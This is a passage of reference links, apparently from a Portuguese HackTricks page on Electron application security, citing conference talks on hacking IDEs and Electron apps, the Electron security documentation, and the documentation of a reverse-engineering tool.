- [19] [APPSEC Cali 2018 - MarkDoom: como hackeei todas as principais IDEs em 2 semanas](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [20] [ElectroVolt: Pwning aplicativos desktop populares enquanto revela uma nova superfície de ataque no Electron](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [21] [Segurança do Electron](https://www.electronjs.org/docs/latest/tutorial/security)
- [22] [webPreferences de BrowserWindow do Electron](https://www.electronjs.org/docs/latest/api/browser-window#new-browserwindowoptions)
- [23] [REA: faça engenharia reversa de qualquer coisa](https://github.com/morluto/rea)
- [24] [Reconstrução de artefatos JavaScript do REA](https://github.com/morluto/rea/blob/main/docs/javascript-artifact-reconstruction.md)
- [25] [Fluxos de trabalho de aplicativos JavaScript entre camadas do REA](https://github.com/morluto/rea/blob/main/docs/javascript-application-workflows.md)
{{#include ../../banners/hacktricks-training.md}}
